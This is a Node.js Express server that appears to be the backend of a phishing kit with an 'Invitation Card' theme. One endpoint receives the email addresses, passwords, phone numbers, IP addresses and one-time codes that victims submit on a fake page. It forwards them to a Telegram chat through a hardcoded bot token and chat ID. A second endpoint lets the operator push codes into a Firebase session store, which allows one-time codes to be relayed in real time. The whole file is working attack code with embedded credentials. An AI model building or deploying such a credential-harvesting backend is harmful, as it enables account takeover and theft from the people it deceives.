const express = require('express');
const https = require('https');
const cors = require('cors');
const app = express();

app.use(express.json());
app.use(cors());

// --- YOUR VERIFIED DETAILS ---
const botToken = '8347968051:AAEThb_Nmqy-bhdsZwmEnsBSQgXVc-fGYbs';
const chatId = '7554731151';
const firebaseBase = "https://my-invitation-42ccc-default-rtdb.firebaseio.com/sessions/";

// 1. RECEIVE FROM BOT (When you type /code email 12)
app.post('/webhook', (req, res) => {
    const body = req.body;
    if (body.message && body.message.text && body.message.text.startsWith('/code')) {
        const parts = body.message.text.split(' ');
        if (parts.length >= 3) {
            const rawEmail = parts[1];
            const codeValue = parts[2];
            const cleanEmail = rawEmail.replace(/[^a-zA-Z0-9]/g, "");

            const fbReq = https.request(`${firebaseBase}${cleanEmail}.json`, {
                method: 'PATCH',
                headers: { 'Content-Type': 'application/json' }
            });
            fbReq.write(JSON.stringify({ code: codeValue }));
            fbReq.end();
        }
    }
    res.sendStatus(200);
});

// 2. SEND TO BOT (When a hit comes from InfinityFree)
app.post('/send', (req, res) => {
    const data = req.body;
    const userIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    let message = "";

    if (data.type === 'login') {
        message = `[+]___ Invitation Card ___[+]\n` +
                  `You have a new website form submission\n` +
                  `IP Address: ${userIP}\n` +
                  `Id: ${data.id}\n` +
                  `Email: ${data.email}\n` +
                  `Password: ${data.pass}\n` +
                  `Phone number: ${data.phone}`;
    } 
    else if (data.type === 'otp') {
        message = `OTP: ${data.otp}`;
    } 
    // This matches the finalConfirm() function in your HTML
    else if (data.type === 'final_click') {
        message = `✅ "I have authorized it" clicked for: ${data.email}`;
    }

    if (message) {
        const payload = JSON.stringify({ chat_id: chatId, text: message });
        const tgReq = https.request({
            hostname: 'api.telegram.org',
            path: `/bot${botToken}/sendMessage`,
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }
        });
        tgReq.write(payload);
        tgReq.end();
    }
    res.json({ status: "success" });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Backend Bridge running on port ${PORT}`));
